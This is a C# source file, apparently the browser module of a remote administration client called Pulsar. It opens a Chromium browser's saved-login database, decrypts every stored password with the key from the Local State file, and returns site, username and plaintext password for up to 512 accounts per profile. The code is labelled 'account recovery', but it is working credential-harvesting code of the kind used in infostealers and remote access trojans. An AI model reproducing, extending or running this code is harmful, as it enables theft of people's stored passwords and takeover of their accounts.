using Pulsar.Client.Recovery.Utilities;
using Pulsar.Common.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Recovery.Browsers
{
    /// <summary>
    /// Provides basic account recovery capabilities from chromium-based applications.
    /// </summary>
    public class ChromiumBase
    {
        public const int MaxAccountsPerProfile = 512;

        public sealed class ReadOutcome
        {
            public List<RecoveredAccount> Accounts { get; set; } = new List<RecoveredAccount>();
            public PasswordRecoveryStatus Status { get; set; } = PasswordRecoveryStatus.Empty;
            public string Detail { get; set; }
            public bool Truncated { get; set; }
        }

        public static ReadOutcome ReadAccountsBounded(string filePath, string localStatePath, string appName)
        {
            var outcome = new ReadOutcome();
            if (string.IsNullOrEmpty(appName) || appName.Equals("Local", StringComparison.OrdinalIgnoreCase))
            {
                outcome.Status = PasswordRecoveryStatus.Unsupported;
                outcome.Detail = "The source is not a supported Chromium browser profile.";
                return outcome;
            }

            if (!File.Exists(filePath))
            {
                outcome.Status = PasswordRecoveryStatus.Unsupported;
                outcome.Detail = "The Chromium Login Data database was not found.";
                return outcome;
            }

            var decryptor = new ChromiumDecryptor(localStatePath);
            if (!decryptor.IsAvailable && decryptor.IsLocked)
            {
                outcome.Status = PasswordRecoveryStatus.Locked;
                outcome.Detail = string.IsNullOrEmpty(decryptor.LastError) ? "The Chromium credential key is locked." : decryptor.LastError;
            }

            SQLiteHandler sqlDatabase;
            try
            {
                sqlDatabase = new SQLiteHandler(filePath);
            }
            catch (Exception ex)
            {
                outcome.Status = PasswordRecoveryStatus.Failed;
                outcome.Detail = ex.GetType().Name;
                return outcome;
            }

            if (!sqlDatabase.ReadTable("logins"))
            {
                outcome.Status = PasswordRecoveryStatus.Unsupported;
                outcome.Detail = "The Chromium login table is unavailable.";
                return outcome;
            }

            int rowCount = sqlDatabase.GetRowCount();
            int boundedCount = Math.Min(rowCount, MaxAccountsPerProfile);
            outcome.Truncated = rowCount > boundedCount;

            for (int i = 0; i < boundedCount; i++)
            {
                try
                {
                    var host = sqlDatabase.GetValue(i, "origin_url");
                    var user = sqlDatabase.GetValue(i, "username_value");
                    var value = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));

                    if (string.IsNullOrEmpty(host) || string.IsNullOrEmpty(user) || string.IsNullOrEmpty(value))
                        continue;

                    outcome.Accounts.Add(new RecoveredAccount
                    {
                        Url = host,
                        Username = user,
                        Password = value,
                        Application = appName
                    });
                }
                catch (Exception)
                {
                    // Ignore malformed or locked rows; source status remains authoritative.
                }
            }

            if (outcome.Accounts.Count > 0)
                outcome.Status = PasswordRecoveryStatus.Supported;
            else if (outcome.Status != PasswordRecoveryStatus.Locked)
                outcome.Status = PasswordRecoveryStatus.Empty;

            return outcome;
        }

        /// <summary>
        /// Reads the stored accounts of an chromium-based application.
        /// </summary>
        /// <param name="filePath">The file path of the logins database.</param>
        /// <param name="localStatePath">The file path to the local state.</param>
        /// <returns>A list of recovered accounts.</returns>
        public static List<RecoveredAccount> ReadAccounts(string filePath, string localStatePath, string appName)
        {
            return ReadAccountsBounded(filePath, localStatePath, appName).Accounts;
        }
    }
}
